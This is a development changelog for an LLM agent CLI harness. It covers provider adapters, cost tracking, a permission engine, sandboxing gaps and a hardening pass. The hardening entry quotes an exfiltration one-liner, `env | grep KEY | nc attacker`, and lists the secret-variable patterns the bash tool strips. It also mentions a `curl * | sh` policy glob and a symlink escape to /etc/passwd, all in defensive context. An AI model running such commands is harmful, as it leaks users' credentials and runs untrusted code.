- **`cost_per_1k_cached_input` / `cost_per_1k_cache_write` fall through to `cost_per_1k_input`** when undeclared. Charging the raw input rate is loud failure — overcounts vs. the discount tier rather than undercounting silently to zero. A model entry that forgets to declare cache rates will show inflated cost and surface the gap in `agent audit costs`.
- **OpenAI provider opts into `stream_options.include_usage` unconditionally.** Without the flag, the final chunk has no `usage` field. A handful of compatibility endpoints (early Azure, some OpenRouter setups) ignore it; the normalizer falls back to a zeroed UsageInfo so the harness still sees a usage event and `costUsd` reads as 0 instead of crashing.
- **Storage migration is additive (`ALTER TABLE` for two columns).** Reusing existing `messages.tokens_in/tokens_out/cached_tokens` rather than introducing a parallel `usage_events` table — keeps queries ergonomic (`SELECT cost_usd FROM messages WHERE session_id = ?`). Per-message `cost_usd` redundant with `tokens × pricing` but stored anyway because `audit costs --by tool` (spec §1) shouldn't have to re-derive pricing every query.
- **Mock provider in tests gains `capsOverride`** for cost-bearing tests (`cost_per_1k_input: 0` was the default; that hides cost bugs). Existing tests stay zero-cost.
- **`collectNonUsage` helper** in stream tests instead of updating ~30 inline arrays. The tests are pinning canonical event order; usage arriving as a new event would force boilerplate without testing anything different. Dedicated usage tests use raw `collect`.

**Out of scope (still M2+):**
- `agent audit costs --by tool / --by session` CLI subcommands (spec §1) — needs M2 Step on session listing/inspection
- Compaction (next Step — uses these usage numbers to decide trigger threshold)
- Cache breakpoint hints to the provider (CONTEXT_TUNING)
- Real-network test fixtures for usage extraction (deferred to evals)
- `agent stats --tokens` discrepancy detector (TOKEN_TUNING §8.3) — needs local tokenizer (M5)
- Honest pricing values in capabilities — they're still illustrative per `PROVIDERS.md §5`; dynamic pricing config deferred

**Code-review fixes folded in before commit:**
- **Anthropic cache_write rates declared explicitly.** All three Anthropic models (`opus-4-7`, `sonnet-4-6`, `haiku-4-5`) now carry `cost_per_1k_cache_write` at 1.25× their input rate per Anthropic's public pricing. Before this fix, `computeCost` fell back to the raw input rate for cache-creation tokens, undercounting Anthropic cache-write turns by 25%. The first review pass mislabeled the fallback as "overcount" — it was the opposite direction.
- **`computeCost` docstring rewrites the cache-fallback decision honestly.** Says "undercounts on Anthropic, declare the rate explicitly" instead of the original "overcounts slightly" claim.
- **OpenAI `stream_options.include_usage` is opt-out via `CreateOpenAIProviderOptions.includeUsage`.** Some compat endpoints (older Azure deployments, certain proxies) reject unknown params with HTTP 400; the option lets users disable telemetry rather than fail the run. Default stays `true`. Two new tests pin both branches: that the param is forwarded by default, and that `includeUsage: false` omits it.
- **`mergeUsage` (Anthropic adapter) uses `Math.max` instead of overwrite.** Today's SDK reports cumulative; if a future shift to incremental deltas (or interim partial counts) ever happens, the largest-seen value wins instead of a smaller late event silently shrinking totals. Regression test pins it.
- **OpenAI normalizer extracts usage AFTER emitting `start`.** Reading `chunk.usage` first was harmless today (the usage-only chunk has empty choices and falls through), but the canonical contract is "start-first"; reordering keeps the invariant.
- **Harness writes NULL token/cost columns when no `usage` event was seen.** New `usageSeen` flag on `CollectedStep` flips `true` only when an actual `kind: 'usage'` event arrived. Lets downstream analytics (`agent audit costs`) tell "adapter never reported" from "turn measured zero". Three new collect.test.ts cases cover the flag transitions; loop test asserts NULL persistence.
- **`formatCost` is magnitude-aware.** Sub-$1 keeps 4 decimals (real billing precision matters there); $1–$100 uses 3; $100+ uses 2. Long sessions no longer print `$50.0000`-style cosmetic noise. Test sweeps three ranges.
- **`collectNonUsage` consolidated** into `tests/providers/_stream-helpers.ts` instead of duplicated across 3 files. Imported by all stream tests.
- **Migration 003 carries a note** that `cost_usd` is intentionally a write-time snapshot, not a recomputable derivation — historical rows preserve the rate the user was actually billed at, even if pricing config drifts later.

**Pending:** none for this step.

**Next:** M2 / Step 2 — Output sanitization (CSI escape stripping in `bash` / `read_file` / `grep` outputs before content reaches the model). Small, isolated, closes a security gap from M1. After that, compaction.

---

## [2026-04-27] M1 / Step 7 — Hardening pass

Addresses the 10-issue review of M1: real reliability/security gaps caught
before shipping. Each fix has a regression test where unit-testable.

**Done:**
- `src/storage/json-safe.ts` — `parseJsonSafe(raw, context)` + `StorageJsonError`. `messages.fromRow` and `tool_calls.fromRow` route through it so a tampered DB surfaces a typed error instead of a bare `SyntaxError` from `JSON.parse`.
- `src/permissions/matcher.ts` — `matchPath` now realpath-resolves the target before matching. A symlink at `src/link → /etc/passwd` no longer matches the `src/**` pattern (the matcher sees `/etc/passwd` and falls out via the cwd-anchored fallback). Two regression tests cover symlink-on-file and symlink-on-directory; one pins that non-existent paths (write_file new file) still match via parent realpath.
- `src/harness/invoke-tool.ts` — the tool_call setup (`createToolCall` + `recordApproval` + `startToolCall`/`finishToolCall`) is now wrapped in `withTransaction`. A crash between those statements no longer leaves orphan rows or stuck-pending status with a "should be denied" approval.
- `src/harness/loop.ts` — entire loop body wrapped in `try { ... } catch (e) { return guardedFinish(e) }`. SQLite errors from `appendMessage`/etc. now produce a clean `error/providerError` exit instead of crashing the caller.
- `src/harness/loop.ts` — wall-clock cap is now enforced *during* a step. `AbortSignal.any([callerSignal, wallClockController.signal])` composes the user's signal with a `setTimeout(..., maxWallClockMs)` controller. A hung provider/tool gets the abort signal mid-execution; provider and tools already honor the signal.
- `src/harness/loop.ts` — the partial tool_results message persisted on `maxToolErrors` bail is now also pushed to the in-memory `messages` array, keeping the two views in sync. Footgun for any future code that reads `messages` post-bail (resume/replay).
- `src/harness/retry.ts` — new `generateWithRetry(provider, req, opts)` wraps `provider.generate()` per CONTRACTS.md §4. Retries on 429 / 5xx / network errors with exponential backoff (200/800/3200 ms by default, 3 attempts). Refuses to retry once any event has yielded — replaying mid-stream would emit duplicates. `isRetryableError` duck-types `e.status` and `e.code` instead of importing every SDK's error class. The harness's `collectStep` call goes through this.
- `src/tools/builtin/bash.ts` — env scrub before spawn. Strips `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_PASS`, `AWS_*`, `OPENAI_*`, `ANTHROPIC_*`, `GOOGLE_API_KEY`, `GEMINI_API_KEY`, `GITHUB_TOKEN`/`GH_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD`. Closes the obvious `bash("env | grep KEY | nc attacker")` exfil path; not a substitute for the M2 sandbox.
- `src/cli/output/{plain,json}.ts` — renderers now accept injectable `out`/`err` sinks so they can be unit-tested without spawning subprocesses or hijacking `process.stdout/stderr`. Plain renderer also gains `maxArgsChars` (default 200) so `tool_invoking` doesn't dump 10KB of `write_file` content into the terminal. Added `provider_event` → `error` → stderr path that the original renderer silently dropped.
- `src/cli/run.ts` — `RunOptions.rendererOverride` and `RunOptions.errSink` test seams so end-to-end runs can be exercised without polluting process streams.

**New tests:**
- `tests/storage/json-safe.test.ts` — 1 test asserting tampered `messages.content` surfaces as `StorageJsonError` with the right context string.
- `tests/permissions/symlink.test.ts` — 4 tests: symlink-on-file escape rejected, symlink-on-directory escape rejected, plain path still matches, write-new-file still matches via parent realpath.
- `tests/harness/retry.test.ts` — 13 tests: `isRetryableError` matrix (429/5xx/4xx/network codes/non-Error), happy passthrough, retry-and-succeed, no-retry-after-yield, no-retry on non-retryable, exhaustion throws last error, custom sleep schedule pins backoff.
- `tests/cli/output-plain.test.ts` — 14 tests: every event type's stdout/stderr split, args truncation, color on/off ANSI presence, deny/confirm formatting, allow silent, flush trailing newline.
- `tests/cli/output-json.test.ts` — 3 tests: NDJSON shape, provider_event roundtrip, flush no-op.
- `tests/cli/run.test.ts` — 8 tests: `exitCodeFor` matrix, end-to-end with mock provider for happy/exhausted/aborted/bootstrap-failure, renderer.flush invocation.
- `tests/tools/bash.test.ts` — added 1 test asserting `ANTHROPIC_API_KEY`, `MY_TOKEN`, `AWS_SECRET_ACCESS_KEY` are scrubbed from subprocess env while non-sensitive vars pass through.
- Total suite: **334 pass / 6 skip / 714 expect() calls** in ~1.6s. +49 tests over Step 6.

**Code-review fixes folded in before commit:**
- **Abort during provider stream now returns `interrupted/aborted` (or `interrupted/maxWallClockMs`) instead of `error/providerError`.** When the SDK throws on signal abort mid-call, the harness's `collectStep` catch now checks `signal.aborted` first and routes to the matching ExitReason. User Ctrl+C while a provider hangs gets a clean exit code 130 instead of the misleading exit code 1 with "harness: aborted" detail. Regression test pins it.
- **New `'internalError'` exit reason** for uncaught throws in the harness path (typically SQLite errors). Was reusing `'providerError'`, which mislabeled DB errors as provider failures in the audit trail. Both still map to `error` status / exit 1; the difference is just diagnostic clarity.

**Decisions:**
- **Retry only before yield.** Retrying mid-stream would replay the partial output and produce duplicates. The common failure mode (429/connect refused) happens before any event is emitted; that's the case we cover.
- **Retry detection is duck-typed** (`e.status`, `e.code`) not type-checked against SDK error classes. Each provider SDK has its own error hierarchy; importing all of them would couple `retry.ts` to every adapter.
- **Realpath fallback chain** for non-existent targets: try the path itself, then `realpath(parent) + basename`. Keeps `write_file` working on new files while still catching symlinked parent dirs (the realistic escape).
- **Wall-clock combined via `AbortSignal.any`** rather than a separate periodic check. Composing signals propagates to provider/tool naturally — they already honor the signal — so no second abort plumbing is needed.
- **Env scrub by name pattern** rather than allowlist. Allowlist breaks every script that needs its specific env vars; deny-by-name catches the leak shape without breaking common tooling.
- **Renderer sinks are functions, not streams.** `(s: string) => void` is trivial to test; passing a `WritableStream` would require Bun's stream API in tests. The function shape also lets us collect strings into arrays for assertions.
- **`StorageJsonError` is a typed class** rather than a string match in messages. Lets future code differentiate corruption from logic errors.
- **`bash` env scrub list intentionally over-broad.** Catches false positives (a legit `BUILD_TOKEN` in CI) but the failure mode is "subprocess can't see the var" which is debuggable; the alternative (under-scrub) is silent credential leakage.

**Out of scope (still M2+):**
- Sandbox proper (bwrap / sandbox-exec)
- Trust prompt for new directories
- Hierarchy enterprise→user→project→session permission merging
- Cost tracking via provider token usage
- Hooks (PreToolUse, PostToolUse)
- Resume / replay / session picker
- Real network integration tests for retry (requires evals harness)
- Concurrent SQLite access stress tests (M2 with subagents)
- DB file mode 0600 (cosmetic; doc gap)

**Pending:** none.

**Next:** M2 plan. Top candidates from the spec, ranked by likely pain when actually using the CLI: cost tracking + telemetry, compaction, resume from session id, plan mode, sandbox, doctor command.

---

## [2026-04-27] M1 / Step 6 — One-shot CLI + harness lifecycle events (closes M1)

**Done:**
- `src/harness/types.ts` — `HarnessEvent` union (`session_start`, `step_start`, `provider_event`, `tool_invoking`, `tool_decided`, `tool_finished`, `session_finished`) + `onEvent` callback on `HarnessConfig`.
- `src/harness/collect.ts` — `collectStep` now accepts an `onEvent` forwarder so each provider stream event surfaces in real time. Renderer throws are swallowed.
- `src/harness/loop.ts` — emits the lifecycle events around each step, around each tool invocation, and around the session itself. `safeEmit` helper makes the integration crash-proof.
- `src/harness/invoke-tool.ts` — `InvokeToolResult` now carries the `Decision | null` so the loop can fire `tool_decided` events for renderers (null when the tool wasn't found, since no decision happened).
- `src/cli/args.ts` — hand-rolled parser. Flags: `--version`/`-v`, `--help`/`-h`, `--json`, `--model <id>`, `--max-steps <n>`. Unknown flag → reject with diagnostic. Anything not a flag is collected as the prompt (joined by spaces).
- `src/cli/bootstrap.ts` — `bootstrap(input)` builds a `HarnessConfig` from cwd + env. Default model is `anthropic/claude-sonnet-4-6`. Loads `./.agent/permissions.yaml` if present (returns `policySource: 'project'`), otherwise falls back to `defaultPolicy()` (strict + empty rules — refuses everything until explicitly configured). Migrates the DB. Registers the 6 builtin tools. Exposes `providerOverride` and `dbPath` test seams.
- `src/cli/output/{types,plain,json}.ts` — `OutputRenderer` interface, plus two implementations:
  - `plain.ts` for TTY/pipe output: assistant text streams to stdout, tool indicators and lifecycle markers go to stderr (so a piped stdout stays a clean transcript). ANSI colors only when stderr is a TTY and `NO_COLOR` is unset.
  - `json.ts` for `--json`: NDJSON lines to stdout, one per `HarnessEvent`. Spec §2.2: in `--json`, stdout is NDJSON only.
- `src/cli/signal.ts` — `installSignalHandler` wires SIGINT to an `AbortController`. First Ctrl+C requests graceful abort; second forces `process.exit(130)`.
- `src/cli/run.ts` — orchestrator. Picks renderer, builds bootstrap input from args, installs signal handler, calls `runAgent`, maps the `HarnessResult` to a process exit code per spec §2.2 (0 done · 1 error · 2 exhausted · 130 interrupted).
- `src/cli/index.ts` — full rewrite. Was a stub that exited 1; now dispatches to `run` after parsing args, with `--version`/`--help` short-circuits and a `missing prompt` error path.
- `tests/cli/args.test.ts` — **15 cases** covering each flag, value parsing, rejection of unknown flags / non-numeric `--max-steps` / missing `--model` value, mixed-flag prompts, empty argv.
- `tests/cli/bootstrap.test.ts` — **7 cases** with isolated tmpdirs and a mock provider: default model, model override, unknown-model rejection, project policy loading, default-policy fallback, budget forwarding, DB migration.
- `tests/harness/events.test.ts` — **6 cases** for the `onEvent` contract: bracketing events, `step_start` per iteration, `provider_event` forwarding, full `tool_invoking → tool_decided → tool_finished` sequence, `tool_decided` skipped for unknown tools (no decision was made), throwing renderer doesn't derail the loop.
- `tests/cli.test.ts` updated for the new entry: `--help` exit 0 with usage, missing prompt exits 1 with usage, unknown flag rejected, unknown model from bootstrap surfaces in stderr.
- Total suite: **289 pass / 6 skip / 617 expect() calls** in ~1.6s.

**Code-review fixes folded in before commit:**
- **`bootstrap` no longer leaks the DB on throw.** Reordered to load policy and resolve the provider *before* opening SQLite, since those steps can throw on malformed YAML or unknown model. `migrate` (the only remaining throw-source after the DB opens) is wrapped in try/catch that closes the DB on throw. Two regression tests assert the DB file isn't even created when bootstrap aborts.
- **`src/cli/index.ts` now catches stray throws from `main()`.** Top-level `await main()` was unwrapped — any sync throw from `parseArgs` or stdout/stderr writes would surface as Bun's default unhandled-rejection trace instead of a "forja: ..." diagnostic.
- **`--max-steps` rejects decimals, hex, scientific notation, and leading zeros.** Was: `Number.parseInt('3.5', 10)` returned `3` and silently passed validation. Now: regex `^[1-9][0-9]*$` validates the literal before parsing. Three regression tests pin the behavior.
- **Dead code removed from `args.ts`.** `FLAGS_REQUIRING_VALUE` was declared and consulted in the default branch, but the flags it listed were already intercepted by their explicit `case`s — the check could never fire. Default branch simplified to rejecting any `--`-prefixed token outright.

**Decisions:**
- **No Ink in M1.** The roadmap mentioned "Ink mínimo" but plain text + ANSI delivers a working one-shot CLI today. Ink belongs with the *interactive* TUI (input editor, slash commands, ongoing conversation) which is M2 territory. Adding React + Ink for one-shot streaming would be ~300 lines of components for output that ANSI does in 80 lines. Documented as deliberate deferral.
- **Hand-rolled arg parser.** The flag set is small (5 flags) and stable. Adding `commander` or `yargs` would be more surface area than the parser itself. ~80 lines.
- **`OutputRenderer` interface** sits between the harness and the actual renderer. Plain + JSON ship now; an `InkRenderer` can drop in next without touching the harness or the CLI dispatch.
- **Stdout vs stderr split:** assistant text → stdout (clean transcript when piped); everything else (tool indicators, lifecycle markers, summary) → stderr. Aligns with spec §2.2 ("stdout puro, stderr pra log") and lets `agent "summarize X" > out.md` work intuitively.
- **Color detection looks at `stderr.isTTY`**, not stdout. Tool indicators live on stderr; if it's piped, ANSI would corrupt the log. `NO_COLOR` env var disables colors regardless.
- **Default policy is strict + empty.** First-time users hit a deny on every tool, which forces them to opt in via `.agent/permissions.yaml`. Surprising at first but the right default for a tool that runs `bash`. Documented in usage.
- **`onEvent` is synchronous.** Async would let renderers do work before the loop continues but adds complexity (await per event) and doesn't help the current renderers. Sync + crash-proof (try/catch around each call) is the right trade for M1.
- **`tool_decided` is skipped for unknown tools.** No decision happened; emitting an event would imply one. Renderers can rely on the invariant: if `tool_decided` fires, there's a real `Decision`.
- **DB closes on every CLI exit path** — `try/finally` in `run.ts`. SQLite WAL leaves dangling files if not closed cleanly.
- **Exit 130 for both abort and SIGINT.** Unix convention for "terminated by signal 2 (INT)". Even though the wall-clock cap also returns `interrupted`, that's fine — exit 130 means "didn't run to completion", not specifically "user pressed C".

**Out of scope:**
- Ink components and interactive TUI — M2
- Slash commands (`/help`, `/cost`, `/model`, `/clear`) — M3
- Resume / `--resume <id>` — M2
- Plan mode (`--plan`) — M2
- Replay (`--replay <id>`) — M2
- Cost display (no token extraction yet) — M2
- `--list-tools`, `--list-sessions`, `agent doctor` — M2
- Capability detection beyond TTY/NO_COLOR (truecolor, locale, image protocol) — M2
- `agent` with no prompt as REPL — M2
- Hierarchy resolution for permissions (enterprise → user → project) — M2

**Pending:** none for this step. **M1 closes here.**

**Next:** M2. Plenty of options (compaction, telemetry/cost, plan mode, resume, sandbox, doctor, more eval coverage). Decide priority once we run the CLI against real models for a while and see what hurts.

---

## [2026-04-27] M1 / Step 5 — Agent Harness (autonomous loop)

**Done:**
- `src/harness/types.ts` — `RunBudget` (`maxSteps`, `maxWallClockMs`, `maxToolErrors`, `maxRepeatedToolHash`, `maxOutputTokensPerCall`), `DEFAULT_BUDGET`, `ExitReason` enum (`done`/`maxSteps`/`maxWallClockMs`/`maxToolErrors`/`degenerateLoop`/`aborted`/`providerError`/`scriptExhausted`), `HarnessConfig`, `HarnessResult`.
- `src/harness/collect.ts` — `collectStep(events)` drains a provider stream into `{message_id, text, tool_uses, thinking, stop_reason, errors}`. Tool names from `tool_use_start` are tracked by id and reattached on `_stop` (canonical event has only the id at stop time). Orphan stops become `harness.orphan_tool_use_stop` errors instead of crashes.
- `src/harness/invoke-tool.ts` — single-tool pipeline. Lookup → persist `tool_calls` row → engine.check → record approval → start/finish with the right status. `confirm` decisions become `confirm_no` denials in M1 (no UI yet); the original prompt is surfaced to the model in the tool_result. Tool exceptions never propagate; they're wrapped as `tool.exception` errors.
- `src/harness/loop.ts` — `runAgent(config)` autonomous loop. Builds the running message list, calls provider, builds assistant content blocks (text first, then tool_uses) for both DB persistence and the next request, drives every tool through `invokeTool`, accumulates tool_results into the next user message. Snapshots `messages` on each request so post-call mutations don't retroactively change what the provider observed. Sliding-window degenerate-loop detector (sha256 of `name:stableJson(args)`, window 5, threshold from `budget.maxRepeatedToolHash`).
- `src/harness/index.ts` — public surface.
- `tests/harness/collect.test.ts` — **8 tests**: text-only, single tool_use lifecycle, parallel tool_uses tracked by id, text+tool_use coexistence, thinking_delta, error events captured, orphan-stop defensive path, default stop_reason.
- `tests/harness/invoke-tool.test.ts` — **6 tests**: happy path with approval row + tool_call lifecycle, unknown tool (no DB rows), policy deny, M1 confirm-becomes-denied with prompt surfaced, tool returning ToolError, tool throwing → `tool.exception`.
- `tests/harness/loop.test.ts` — **10 tests** with a scripted mock provider: text-only one-step done, tool→result→done two-step (with assertion that the second request observes the tool_result message), maxSteps cap, pre-aborted signal, unknown tool (loop continues), policy deny (loop continues), maxToolErrors cap, degenerateLoop detection (identical args), session/messages persisted to SQLite, provider crash → providerError with detail.
- Total suite: **254 pass / 6 skip / 529 expect() calls** in ~670ms.

**Code-review fixes folded in before commit:**
- **Gemini integration unblocked.** The harness emits user messages with `tool_result` blocks; the Gemini adapter rejected them because Gemini correlates by function name, not id. Now `ProviderToolResultBlock` carries an optional `name`, the harness populates it from `input.toolName` on every result (success and error paths), and the Gemini adapter converts to `functionResponse` instead of throwing. Anthropic and OpenAI ignore the field. Two new tests pin the contract: Gemini conversion with `name` works; the missing-`name` case still throws (for catching harness bugs).
- **Empty error messages no longer get lost.** `(e as Error).message ?? String(e)` returned `""` when an `Error` had an empty message (nullish coalescing only catches null/undefined). Replaced with `e.message || e.name || String(e)` — falls through to the constructor name and finally `toString` so we never report `tool crashed: ` with no body. Same fix in the harness `providerError` path.

**Decisions:**
- **`maxCostUsd` deferred to M2.** Stream events don't expose token usage in M1 (the normalizer drops `message_delta.usage`); cost tracking lives with telemetry.
- **`confirm` → `confirm_no` in M1**, with the prompt text mirrored into the tool_result so the model sees *why* it was denied. Step 6 (TUI) replaces this branch with a real prompt and decides `confirm_yes`/`confirm_no` based on user input.
- **No checkpoint creation in this step.** The plan listed "checkpoints básicos" but the table doesn't exist yet; adding a stub now would be dead code. Migration 003 + git-stash integration land in M3 with the rest of the rollback subsystem.
- **`messages` array is cloned per request** (`{...messages}`). The previous version passed a shared reference; mutations during the next iteration would have changed what the provider observed (caught by a test asserting the second request sees the tool_result message as the last entry).
- **Hash window is in-memory.** Spec §13 has `tool_calls.input_hash` for SQL-side analysis; the harness's degenerate-loop detection uses an in-process sliding window keyed on `sha256(name + stableJson(args))`. SQL-side detection is M2.
- **All registered tools are sent to the provider.** No filtering by playbook/role yet — the harness exposes the full registry. Filtering is a Step 6 / playbooks (M3) concern.
- **Aborted signal is checked before each step AND between tool invocations within a step.** A multi-tool step honors abort mid-execution rather than waiting for the next iteration.
- **`scriptExhausted` exit reason** is reserved for the mock provider draining (test-only path); production providers never hit it.

**Out of scope:**
- Streaming UI — the harness collects whole steps before persisting (Step 6 will tee events to UI)
- Compaction — full message history sent every turn (M2)
- Checkpoints — `tool.metadata.writes` flag is read but no snapshot is taken (M3)
- Hooks (PreToolUse, PostToolUse, Stop, etc.) — M4
- Subagents (`task_*`) — M3
- Resume from DB — current loop only runs forward from a fresh user prompt (M2)
- Cost tracking — needs token usage extraction in stream normalizer (M2)
- Provider retry/backoff on 5xx — would wrap provider.generate; harness in M2

**Pending:** none for this step.

**Next:** Step 6 — Ink TUI mínimo + one-shot mode wiring. Connect the CLI entry (`src/cli/index.ts` is still a stub) to `runAgent` with a real Anthropic provider, render streaming output and tool calls in the terminal, wire `Ctrl+C` to the AbortSignal. Closes M1.

---

## [2026-04-27] M1 / Step 4 — Permission Engine + Tool System + 6 builtin tools

**Done:**
- `src/storage/migrations/002-approvals.ts` — adds the `approvals` table per AGENTIC_CLI §13 (FK cascades from `tool_calls`, CHECK constraints on `decision` and `decided_by`, index on `tool_call_id`).
- `src/storage/repos/approvals.ts` — `recordApproval`, `listApprovalsByToolCall`. Exported through `src/storage/index.ts`.
- `src/permissions/types.ts` — `Policy`, `PolicyMode` (`strict` | `acceptEdits` | `bypass`), `PolicyCategory` (`fs.read` | `fs.write` | `bash` | `web.fetch` | `misc`), `Decision` (allow / deny / confirm), per-tool rule shapes (`BashPolicy`, `PathPolicy`, `FetchPolicy`), `PermissionsView`.
- `src/permissions/matcher.ts` — `matchPath` (Bun.Glob, cwd-anchored so `**/foo` can't reach `/etc/passwd`), `matchCommand` and `matchHost` (custom glob→regex compiler so `*` matches across `/` and spaces), plus `firstMatching*` helpers for diagnostics.
- `src/permissions/engine.ts` — `createPermissionEngine(policy, opts)` returns `check(toolName, category, args) → Decision`. Order: deny rules first (always win), then allow, then confirm; default = deny. `bypass` short-circuits to allow. `acceptEdits` upgrades unmatched writes from deny to confirm (not auto-allow — see Decisions).
- `src/permissions/config.ts` — `parsePolicy`, `loadPolicyFromString`, `loadPolicyFromFile`, `defaultPolicy`. Strict validator: rejects mistyped keys (`allow_path` instead of `allow_paths` is the bug class), rejects malformed mode values, rejects non-mapping top-level.
- `src/permissions/index.ts` — public surface.
- `src/tools/types.ts` — `Tool<I, O>`, `ToolContext` (signal + cwd + sessionId + stepId + permissions per CONTRACTS §2), `ToolResult<O> = O | ToolError`, `isToolError` discriminator, `toolError` constructor, `ERROR_CODES` enum.
- `src/tools/registry.ts` — `createToolRegistry`.
- `src/tools/builtin/{read-file,write-file,edit-file,glob,grep,bash}.ts` — six tools, all returning `ToolResult` (no thrown errors).
- `src/tools/builtin/index.ts` — `BUILTIN_TOOLS` array + `registerBuiltinTools(reg)` helper.
- `src/tools/index.ts` — public surface.
- `.github/workflows/ci.yml` — adds `apt install ripgrep` step so the grep tool's tests run instead of skipping.
- New dep: `yaml@latest` (parser).
- New tests:
  - `tests/storage/approvals.test.ts` — 6 cases: roundtrip, ordering, FK cascade, CHECK rejections, FK rejection on unknown tool_call_id.
  - `tests/permissions/matcher.test.ts` — 18 cases covering path resolution (relative, absolute, outside-cwd), command matching (exact, prefix, wildcard with spaces and slashes), host matching (case, glob), `firstMatching*` helpers.
  - `tests/permissions/engine.test.ts` — 17 cases: bash allow/deny/confirm, path allow/deny/confirm, mode behaviors (strict/acceptEdits/bypass), web.fetch hosts, misc category, missing-arg rejections.
  - `tests/permissions/config.test.ts` — 10 cases: full policy parse, mode default, malformed-key rejection, YAML syntax errors, default policy.
  - `tests/tools/registry.test.ts` — 4 cases.
  - `tests/tools/_helpers.ts` — shared `makeCtx()` for tool tests.
  - `tests/tools/{read-file,write-file,edit-file,glob,bash}.test.ts` — 5 happy-path + error-path + abort-signal coverage per tool.
  - `tests/tools/grep.test.ts` — 6 cases gated on `rg` availability via `describe.if(RG_AVAILABLE)` (skips locally if ripgrep missing; CI installs it).
- Existing `tests/storage/migrate.test.ts` updated to assert ≥ 2 migrations (was hardcoded to 1).
- Total suite: **228 pass / 6 skip / 446 expect() calls** in ~600ms.

**Code-review fixes folded in before commit:**
- **`acceptEdits` mode now matches spec §8 semantics.** Was: `confirm_paths` still required confirmation AND unmatched writes escalated to confirm. Now: `confirm_paths` for writes auto-allows (skip confirmation step — the actual convenience the mode promises); unmatched writes default-deny (mode is convenience, not bypass); reads keep the same confirm behavior. Deny still wins over confirm in all modes.
- **`PermissionsView.hasPathRule` removed.** It was hardcoded to look up `write_file`/`read_file` rules, ignoring per-tool overrides on `edit_file`/`glob`/etc. — wrong by construction, with no caller. The harness in Step 5 will call `engine.check(toolName, ...)` directly with the right tool name. The view now exposes only `mode`.
- **`parsePolicy` rejects top-level arrays.** Previously slipped through the `typeof === 'object'` check.
- **`bash` wraps `SIGTERM` in try/catch** (was already wrapped on the SIGKILL escalation). The proc can exit on its own between the timer firing and `proc.kill()` running — kill on a dead pid throws ESRCH; we swallow it now.
- **`edit_file` rejects empty `old_string` explicitly** (`edit.old_string_empty`) with a hint pointing to `write_file`. Previously fell through to `old_string_not_found`, which was less diagnostic.

**Decisions:**
- **`Tool.execute` returns `O | ToolError` instead of throwing** (CONTRACTS §2, cláusula 7). Errors are *data*. Tests use `isToolError(out)` discriminator instead of try/catch. The harness in Step 5 catches stray throws and converts them, but builtins don't throw.
- **Custom glob→regex compiler for commands and hosts** instead of `Bun.Glob`. Bun's `*` doesn't cross `/` (correct for paths, wrong for `curl * | sh` where the URL contains `/`). The compiler escapes regex metachars and translates `*`→`.*`, `?`→`.`. The "no regex in policy" rule (CLAUDE.md) is preserved — the user still authors with glob syntax; regex is an internal implementation detail.
- **`acceptEdits` mode upgrades unmatched writes from deny to confirm**, not to auto-allow. The mode is opt-in convenience for refactor sessions, not a free-for-all. Auto-allow lives in `bypass` (which requires an explicit dangerous flag, deferred).
- **Permission categories instead of per-tool rules everywhere.** New tools join an existing category instead of needing a new policy section. The YAML still supports per-tool overrides (`tools.bash`, `tools.write_file`).
- **Path matcher is cwd-anchored.** A pattern like `src/**` resolves against cwd before matching, and an absolute target outside the cwd subtree falls back to direct absolute match. Result: bare `**/foo` can't reach `/etc/passwd` — security property by construction.
- **Strict validator rejects unknown shapes** (e.g., `allow_path` typo'd as singular). Silently ignoring unrecognized keys is how YAML-driven policies turn into "allow-everything" in production.
- **`bash` is `writes: true` pessimistically** (per CONTRACTS §2.6.3). The `read_only` flag in the input schema is a hint *from the caller*, not the tool — Step 5 harness can use it to route through a different policy path.
- **`grep` shells out to `rg`** instead of pure-TS implementation. Performance + battle-tested feature set. Tests skip cleanly if `rg` is missing; CI installs it.
- **Hierarchy resolution is project-only in M1** — no enterprise/user/project/session merging yet. Spec §8 requires it; landing in M2 with the trust subsystem.
- **`yaml` over `js-yaml`** — newer API surface, comparable battle-testing, smaller install footprint.

**Out of scope:**
- Sandbox (`bwrap` / `sandbox-exec`) — M2
- Checkpoint creation before writes — Step 5 / M3
- Hook integration (PreToolUse / PostToolUse) — M4
- Hierarchy enterprise → user → project → session — M2
- Output sanitization (CSI escape stripping) — M2
- The other 15 tools in CONTRACTS §2.6 (background, task_*, memory_*, fetch_url, code retrieval) — later steps/milestones
- Confirmation UI — Step 6 (Ink); engine returns `Decision` shape ready for the UI to consume
- Real-API/network tests for grep — would need fixtures; current coverage is enough for the wrapper

**Pending:** none for this step.

**Next:** Step 5 — Agent Harness loop (autonomous profile) per AGENTIC_CLI §5. Ties storage + provider + permissions + tools together: session lifecycle, message loop with budget, tool invocation pipeline (engine.check → record approval → execute → persist), abort/cancel, basic checkpoint stub.

---

## [2026-04-27] M1 / Step 3.6 — OpenAI (GPT) adapter

**Done:**
- Added `openai@6.34.0` dependency.
- `src/providers/openai/capabilities.ts` — capabilities for `gpt-4o` and `gpt-4o-mini`. Cache mode declared as `client_only` (OpenAI's prefix-cache is automatic and probabilistic — there is no server-side cache the adapter can target the way Anthropic does).
- `src/providers/openai/stream.ts` — `normalizeOpenAIStream` converts Chat Completions chunks into the canonical `StreamEvent` taxonomy. Handles: id from first chunk (synth fallback), text deltas, refusal field (emitted as text_delta), tool_call accumulation per `index` (id and name may straggle, args streamed across deltas), per-tool finalization at end-of-stream (OpenAI has no per-tool stop event), finish_reason mapping, malformed JSON args drop with error event.
- `src/providers/openai/index.ts` — `createOpenAIProvider(modelName, opts)`. Reads API key from `opts.apiKey` or `OPENAI_API_KEY`; supports `baseURL` for OpenAI-compatible endpoints (Azure OpenAI, OpenRouter). Test seam via `opts.client`. Message conversion is the most complex of the three adapters: a single `ProviderMessage` may produce multiple OpenAI messages (assistant text + tool_calls coalesce; tool_result blocks split into separate `role: 'tool'` messages). System prompt prepended as the first message.
- `src/providers/openai/register.ts` — `registerOpenAIModels(reg)`.
- `createDefaultRegistry` got a one-line addition: `registerOpenAIModels(reg)`. No other registry-side changes — the extensibility refactor from Step 3.5 paid off as designed.
- `tests/providers/openai-stream.test.ts` — **13 tests** covering text-only, tool_call lifecycle (incl. straggling id/name), parallel tool_calls finalized in index order, synthesized id, id-overrides-synth, real-id-not-overwritten regression, refusal as text_delta, content+refusal in the same chunk, finish_reason mapping (6 cases), null doesn't clobber, malformed args, empty stream.
